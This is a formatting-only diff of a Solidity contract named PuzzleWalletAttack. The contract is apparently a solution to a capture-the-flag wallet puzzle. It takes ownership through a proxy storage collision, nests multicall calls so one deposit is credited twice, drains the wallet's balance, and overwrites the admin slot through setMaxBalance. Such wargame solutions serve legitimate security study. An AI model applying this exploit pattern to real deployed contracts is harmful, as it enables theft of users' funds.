@@ -12,10 +12,7 @@ contract PuzzleWalletAttack {
     }
 
     function attack() external payable {
-        require(
-            msg.value == address(victimPuzzleWallet).balance,
-            "PuzzleWallet: Value must be eq"
-        );
+        require(msg.value == address(victimPuzzleWallet).balance, "PuzzleWallet: Value must be eq");
 
         // solhint-disable-next-line avoid-low-level-calls
         (bool isSuccess, ) = address(victimPuzzleWallet).call(
@@ -24,28 +21,17 @@ contract PuzzleWalletAttack {
 
         require(isSuccess, "PuzzleWallet: Call error");
 
-        require(
-            address(this) == victimPuzzleWallet.owner(),
-            "PuzzleWallet: Wrong address"
-        );
+        require(address(this) == victimPuzzleWallet.owner(), "PuzzleWallet: Wrong address");
 
         victimPuzzleWallet.addToWhitelist(address(this));
 
-        require(
-            victimPuzzleWallet.whitelisted(address(this)),
-            "PuzzleWallet: Wrong res"
-        );
+        require(victimPuzzleWallet.whitelisted(address(this)), "PuzzleWallet: Wrong res");
 
         bytes[] memory multicallData = new bytes[](1);
-        multicallData[0] = abi.encodeWithSelector(
-            victimPuzzleWallet.deposit.selector
-        );
+        multicallData[0] = abi.encodeWithSelector(victimPuzzleWallet.deposit.selector);
 
         bytes[] memory data = new bytes[](2);
-        data[0] = abi.encodeWithSelector(
-            victimPuzzleWallet.multicall.selector,
-            multicallData
-        );
+        data[0] = abi.encodeWithSelector(victimPuzzleWallet.multicall.selector, multicallData);
 
         data[1] = data[0];
 
@@ -58,17 +44,11 @@ contract PuzzleWalletAttack {
         victimPuzzleWallet.execute(address(this), balance, "");
 
         // solhint-disable-next-line reason-string
-        require(
-            0 == address(victimPuzzleWallet).balance,
-            "PuzzleWallet: Wrong victim balance"
-        );
+        require(0 == address(victimPuzzleWallet).balance, "PuzzleWallet: Wrong victim balance");
 
         victimPuzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
 
-        require(
-            msg.sender == address(uint160(victimPuzzleWallet.maxBalance())),
-            "PuzzleWallet: Attack failed"
-        );
+        require(msg.sender == address(uint160(victimPuzzleWallet.maxBalance())), "PuzzleWallet: Attack failed");
     }
 
     // solhint-disable-next-line no-empty-blocks
